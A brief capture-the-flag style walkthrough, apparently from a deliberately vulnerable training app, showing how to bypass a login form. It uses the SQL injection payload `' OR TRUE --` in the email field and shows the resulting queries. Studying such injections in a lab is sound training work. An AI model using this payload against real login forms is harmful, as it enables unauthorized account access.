## Login Admin
### Challenge: Log in with the administrator's user account.

* Navigate to account login
* Submit `'` in email field and any password to observe error log with SQL query
  ```
  "SELECT * FROM Users WHERE email = ''' AND password = 'c06db68e819be6ec3d26c6038d8e8d1f' AND deletedAt IS NULL"
* Submit `' OR TRUE --` in email field and any password where `'` closes the email string and `OR TRUE --` returns boolean true and comments out the rest of the SQL query
  ```
  "SELECT * FROM Users WHERE email = '' OR TRUE -- AND password = '698d51a19d8a121ce581499d7b701668' AND deletedAt IS NULL"
* Observe login with first user account (happens to be admin in this case)
